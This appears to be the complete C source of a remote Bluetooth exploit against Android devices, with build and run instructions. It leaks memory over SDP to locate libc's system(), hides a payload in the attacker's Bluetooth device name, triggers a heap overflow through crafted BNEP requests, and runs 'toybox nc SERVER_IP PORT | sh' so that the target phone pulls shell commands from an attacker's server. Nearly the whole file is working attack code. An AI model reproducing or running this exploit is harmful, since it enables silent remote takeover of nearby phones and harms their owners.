//copyright @
//huahuaisadog@gmail.com

/***
***Only for android devices***
usage:
$ gcc -o exp exp.c -lbluetooth
$ sudo ./exp TARGET_ADDR SERVER_IP SERVER_PORT
***/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <errno.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

#include "bluetooth_enviroment.h"
#include "dev_config.h"

static char target_addr[20] = {0};
static char payload[100] = {0};
static char overflow_content[9] = {0};
static void *leak_data = NULL;
static int leak_count = 0;
static unsigned int system_libc;
static unsigned int bss_name;
static int bss_base;
static int libc_base;
struct dev_config *current_dev;
static char *remote_cmd;

static int data_unpack(int data) {
	uint8_t split[4];
	int result = 0;
	int i;
	for(i = 0; i < 4; i++)
		split[i] = (data >> (i*8)) & 0xFF;
	for(i = 0; i < 4; i++)
		result |= (split[i] << (8*(3-i)));
	

	return result;

}

#define HEAD_LEN (sizeof(struct l2cap_cmd_hdr))
static int parse_conn_req(void *buffer, __u8 ident, __le16 len, void *data) {
	struct l2cap_cmd_hdr head;
	head.code = L2CAP_CONN_REQ;
	head.ident = ident;
	head.len = len;
	memcpy(buffer, &head, sizeof(head));
	memcpy(buffer + sizeof(head), data, len);
}


#define SDP_SVC_SEARCH_ATTR_REQ 0x6
static int parse_sdp_search_attr_req(void *buffer, __le16 data_len, void *data){
	sdp_pdu_hdr_t pdu_head;
	__le16 tmp;
	
	memset(&pdu_head, 0, sizeof(pdu_head));
	pdu_head.pdu_id = SDP_SVC_SEARCH_ATTR_REQ;
	pdu_head.tid = 0;
	tmp = ((data_len & 0xff) << 8 ) + ((data_len >> 8) & 0xff);
	pdu_head.plen = tmp;
	memcpy(buffer, &pdu_head, sizeof(pdu_head));
	memcpy(buffer + sizeof(pdu_head), data, data_len);
	return data_len + sizeof(pdu_head);
}

#define  SDP_PDU_SERVICE_SEARCH_REQ             0x02
static int parse_sdp_service_search_req(void *buffer, __le16 data_len, void *data){
	sdp_pdu_hdr_t pdu_head;
	__le16 tmp;
	
	memset(&pdu_head, 0, sizeof(pdu_head));
	pdu_head.pdu_id = SDP_PDU_SERVICE_SEARCH_REQ;
	pdu_head.tid = 0;
	tmp = ((data_len & 0xff) << 8 ) + ((data_len >> 8) & 0xff);
	pdu_head.plen = tmp;

	memcpy(buffer, &pdu_head, sizeof(pdu_head));
	memcpy(buffer + sizeof(pdu_head), data, data_len);
	return data_len + sizeof(pdu_head);
}


static int l2cap_set_mtu(int sock_fd, __le16 imtu, __le32 omtu) {
	int ret;
	struct l2cap_options option_arg;
	socklen_t len ;
	memset(&option_arg, 0 ,sizeof(option_arg));

	ret = getsockopt(sock_fd, SOL_L2CAP, L2CAP_OPTIONS, &option_arg, &len);
	if(ret == -1){
		perror("[-]getsockopt failed : ");
		return -1;
	}

	option_arg.imtu = imtu;
	option_arg.omtu = omtu;

	ret = setsockopt(sock_fd, SOL_L2CAP, L2CAP_OPTIONS, &option_arg, sizeof(option_arg));
	if(ret == -1){
		perror("[-]setsockopt failed : ");
		return -1;
	}
	return 0;
}

static int send_first_req(int sock_fd){
	void *buf;
	char data[] = 	"\x35\x03\x19\x01\x00" // L2CAP PATTERN
					"\x00\x10"  //max reply
					"\x00";  // CONTINUATION STATE
	int total_len;

	buf = malloc(0x100);
	memset(buf, 0, 0x100);
	total_len = parse_sdp_service_search_req(buf, sizeof(data) - 1, data);
	send(sock_fd, buf, total_len, 0);
	free(buf);
}

static void append_leak_data(void *recv_buf, int recv_size) {
	int i;
	int *p;
	if(recv_size < 0x15)
		return;
	memcpy(leak_data + leak_count, recv_buf + 0x9, recv_size - 0x9 - 0x3);
	// printf("size : %x",recv_size);
	// for(i = 0, p = recv_buf ; 4*i < recv_size - 0x3; i++){
	// 	printf("[%d] %x \n", i, *p);
	// 	p++;
	// }
	// for(i = 0, p = recv_buf + 0x9; 4*i < recv_size - 0x9 - 0x3; i++){
	// 	printf("[%d] %x \n", i, *p);
	// 	p++;
	// }
	leak_count += recv_size - 0x9 - 0x3;
}

static __le16 get_cont_offset(int sock_fd, int flag) {
	void *recv_buf;
	__le16 cont_offset;
	int ret;

	recv_buf = malloc(0x1000);
	ret = recv(sock_fd, recv_buf, 0x1000, 0);
	if(ret == -1) {
		perror("[-] recv cont_offset : ");
		return -1;
	}

	memcpy(&cont_offset, recv_buf + ret - 2, 2);

	if(flag == 1)
		append_leak_data(recv_buf, ret);

	free(recv_buf);
	return cont_offset;

}

static int send_leak_req(int sock_fd, __le16 cont_offset) { 
	void *buf;
	char data_head[] = "\x35\x03\x19\x01\x00" // L2CAP PATTERN
				  "\x00\x00"  //max reply
				  "\x02";  // CONTINUATION STATE
	char data[40] = {'\0'};
	int data_len = sizeof(data_head) - 1 + sizeof(cont_offset);
	int total_len;

	buf = malloc(0x100);
	memset(buf, 0, 0x100);
	memcpy(data, data_head, sizeof(data_head) - 1);
	memcpy(data + sizeof(data_head) - 1, &cont_offset, sizeof(cont_offset));

	total_len = parse_sdp_service_search_req(buf, data_len, data);
	send(sock_fd, buf, total_len, 0);

	free(buf);

	return 0;
}

static void show_leak_data(){
	int i;
	unsigned int *p = (unsigned int *)leak_data;
	for(i = 0; i < leak_count/sizeof(unsigned int) ; i++) {
		if(i % 4 == 0)
			printf("%08x : ", i/4 * 0x10);
		printf("%08x " ,p[i]);
		if(i % 4 == 3)
			printf("\n");
	}
}

static int leak_stack_data() {
	int sock_fd;
	int i;
	__le16 cont_offset;
	int leak_req_count;
	int ret = -1;
	struct sockaddr_l2 local_l2_addr;
	struct sockaddr_l2 remote_l2_addr;

	leak_count = 0;
	if(leak_data) {
		free(leak_data);
		leak_data = NULL;
	}
	
	leak_req_count = 0x200;
	//char dest[18] = "48:db:50:02:c6:71";  //aosp angler
	//char dest[18] = "dc:a9:04:86:45:cc";   // macbookpro
	//char dest[18] = "00:1A:7D:DA:71:14"; //linux
	// = "00:1a:7d:da:71:13"; //panyu
	

	sock_fd = socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_L2CAP);
	if(sock_fd == -1){
		perror("[-]socket create failed : ");
		return -1;
	}

	memset(&local_l2_addr, 0, sizeof(struct sockaddr_l2));
	local_l2_addr.l2_family = PF_BLUETOOTH;
	memcpy(&local_l2_addr.l2_bdaddr , BDADDR_ANY, sizeof(bdaddr_t));


	ret = bind(sock_fd, (struct sockaddr*) &local_l2_addr, sizeof(struct sockaddr_l2));
	if(ret == -1){
		perror("[-]bind()");
		goto out;
	}


	l2cap_set_mtu(sock_fd, 48, 48);

	memset(&remote_l2_addr, 0, sizeof(remote_l2_addr));
	remote_l2_addr.l2_family = PF_BLUETOOTH;
	remote_l2_addr.l2_psm = htobs(0x1);
	str2ba(target_addr, &remote_l2_addr.l2_bdaddr);

	if(connect(sock_fd, (struct sockaddr *) &remote_l2_addr,sizeof(remote_l2_addr)) < 0) {  
  		perror("[-]Can't connect");  
		goto out;  
	} 


	leak_data = malloc(leak_req_count + 0x100);
	if(leak_data == NULL){
		perror("[-] malloc");
		goto out;
	}

	send_first_req(sock_fd);

	cont_offset = get_cont_offset(sock_fd, 0);

	while(leak_count < leak_req_count){
		send_leak_req(sock_fd, cont_offset);
		cont_offset = get_cont_offset(sock_fd, 1);
		if(cont_offset == -1){
			printf("[-]leak data failed\n");
			goto clean;
		}
	}

	//show_leak_data();

	ret = 0;
	goto out;
clean:
	free(leak_data);
	leak_data = NULL;
out:
	close(sock_fd);
	return ret; 
}

static int get_libc_address() {
	int *p;
	int ret;
	p = (int *)leak_data;
	libc_base = data_unpack(p[0x100/4]) - current_dev->libc_base_offset;
	system_libc = libc_base + current_dev->libc_system_offset + 1;// + 0x2de98 - 0x45f80;

	bss_base = data_unpack(p[0xec/4]) - current_dev->libbluetooth_bss_offset;
	bss_name = bss_base + current_dev->libbluetooth_bss_name_offset + 1;
	printf("[+]system : %x, bss_name : %x\n", system_libc, bss_name);
	return 0;
}
#define HCI_OP_WRITE_LOCAL_NAME		0x0c13
#define HCI_EV_CMD_COMPLETE			0x0e

static int set_local_dev_name(char *name) {
	int dev_id;
	int hci_sock;
	int ret = 0;

	dev_id = hci_get_route(NULL);
	hci_sock = hci_open_dev(dev_id);
	if(dev_id < 0 || hci_sock < 0) {
		perror("[-]create hci socket\n");
		return -1;
	}

	ret = hci_write_local_name(hci_sock, name, 0);
	if(ret == -1) {
		perror("[-]setname failed\n");
	}
	close(hci_sock);
	return ret;
}


#define BNEP_FRAME_CONTROL 0x01
#define BNEP_SETUP_CONNECTION_REQUEST_MSG 0x01
static int parse_fack_bnep_req(void *buffer, int data_len, void *data){
	__u8 type = BNEP_FRAME_CONTROL;
	__u8 extension_present = 1;
	__u8 ctrl_type = BNEP_SETUP_CONNECTION_REQUEST_MSG;
	__u8 len = 0;

	type = (extension_present << 7) | type;

	memcpy(buffer, &type, 1);
	memcpy(buffer + 1, &ctrl_type, 1);
	memcpy(buffer + 2, &len, 1);
	memcpy(buffer + 3, data, data_len);

	return data_len + 3;
}


static void set_payload() {
	char *__payload = &payload[1];
	uint16_t event = 0x1717;
	memset(payload, 0x42, sizeof(payload));
	memcpy(__payload, &event, 2);
	memcpy(__payload + 8, &system_libc, 4);
	//memcpy(payload + 8, "aaaa", 4);
	strcpy(__payload + 12, remote_cmd);
	//payload[20] = '\0';
}

static void prepare_heap(int sock_fd) {
	__u8 type = 1;
	__u8 extension_present = 1;
	__u8 ctrl_type = 9;
	int i;
	char cmd[3] = "\x80\x01\x09";
	char *buffer = malloc(0x310);

	type = (extension_present << 7) | type;

	memcpy(buffer, &type, 1);
	memcpy(buffer + 1, &ctrl_type, 1);
	for(i = 1; i < 0x100; i++)
		memcpy(buffer + 3*i - 1, cmd, 3);

	send(sock_fd, buffer, 0x300, 0);
	free(buffer);
}

static int send_bnep_req(int sock_fd, char *content) { 
	void *buffer;
	int total_len;
	buffer = malloc(0x100);
	memset(buffer, 0, 0x100);

	total_len = parse_fack_bnep_req(buffer, 0x8, content);

	send(sock_fd, buffer, total_len, 0);
	free(buffer);
	return 0;
}

static int send_overflow_data(){
	int sock_fd, ret;
	int i;
	void *buf, *data, *recv_buf;
	struct sockaddr_l2 local_l2_addr;
	struct sockaddr_l2 remote_l2_addr;
	int count = 0;

//	scanf("%d", &i);
	sock_fd = socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_L2CAP);
	if(sock_fd == -1){
		perror("[-]socket create failed : ");
		return -1;
	}

	memset(&local_l2_addr, 0, sizeof(struct sockaddr_l2));
	local_l2_addr.l2_family = PF_BLUETOOTH;
	memcpy(&local_l2_addr.l2_bdaddr , BDADDR_ANY, sizeof(bdaddr_t));


	ret = bind(sock_fd, (struct sockaddr*) &local_l2_addr, sizeof(struct sockaddr_l2));
	if(ret == -1){
		perror("[-]bind()");
		goto out;
	}

	memset(&remote_l2_addr, 0, sizeof(remote_l2_addr));
	remote_l2_addr.l2_family = PF_BLUETOOTH;
	remote_l2_addr.l2_psm = htobs(0xF);
	str2ba(target_addr, &remote_l2_addr.l2_bdaddr);

	if(connect(sock_fd, (struct sockaddr *) &remote_l2_addr,sizeof(remote_l2_addr)) < 0) {  
  		perror("[-]Can't connect");  
  		goto out;
	} 
	printf("[+]prepare_heap\n");


	while(count++ < 20)
		prepare_heap(sock_fd);

	memcpy(overflow_content, "\x00\x00\x00\x00", 4);
	memcpy(overflow_content + 4, &bss_name, 4);
	//memcpy(overflow_content + 4, "aaaa", 4);
	printf("[+]send fack data\n");
	while(count++ < 300) {
		send_bnep_req(sock_fd, overflow_content);	
	}
out:

	close(sock_fd);
	return 0; 
}


static int test_connect() {
	int sock_fd;
	int ret = -1;
	struct sockaddr_l2 local_l2_addr;
	struct sockaddr_l2 remote_l2_addr;

	sock_fd = socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_L2CAP);
	if(sock_fd == -1){
		perror("[-]socket create failed : ");
		return -1;
	}

	memset(&local_l2_addr, 0, sizeof(struct sockaddr_l2));
	local_l2_addr.l2_family = PF_BLUETOOTH;
	memcpy(&local_l2_addr.l2_bdaddr , BDADDR_ANY, sizeof(bdaddr_t));


	ret = bind(sock_fd, (struct sockaddr*) &local_l2_addr, sizeof(struct sockaddr_l2));
	if(connect(sock_fd, (struct sockaddr *) &remote_l2_addr,sizeof(remote_l2_addr)) < 0) {  
  		if(errno == 115) { //Operation now in progress
  			printf("[+]get the shell\n");
  			ret = 1; 
  		}
  		else 
  			printf("[-]failed ,retry\n");
	} 

	close(sock_fd);
	return ret;
}

int main(int argc, char *argv[]) {
	int retry_count;
	int i;
	int pid;
	char server_ip[30];
	char server_port[6];
	
	if(argc < 3) {
		printf("usage : sudo ./exp TARGET_ADDR SERVER_IP SERVER_PORT\n");
		return -1;
	}


	strncpy(target_addr, argv[1], 18);
	strncpy(server_ip, argv[2], 16);
	strncpy(server_port, argv[3], 6);

	remote_cmd = (char *)malloc(0x70);
	sprintf(remote_cmd, ";toybox nc %s %s | sh", server_ip, server_port);

	printf("%s\n", remote_cmd);


	for(i = 0; i < sizeof(dev_list)/sizeof(struct dev_config); i++){
		current_dev = &dev_list[i];
		retry_count = 5;
		while(retry_count-- > 0){
			if(leak_stack_data() != -1)
				printf("[+]leak data success\n");
			get_libc_address();
			set_payload();
			set_local_dev_name(payload);
			sleep(4);
			/*to let remote device store our device name(payload)*/
			leak_stack_data();
			leak_stack_data();
			leak_stack_data();
			leak_stack_data();
			leak_stack_data();
			leak_stack_data();
			leak_stack_data();

			send_overflow_data();
			if(test_connect() == 1)
				exit(0);
			sleep(20);
		}
	}
	return 0;
}

//dc:09:4c:17:8c:02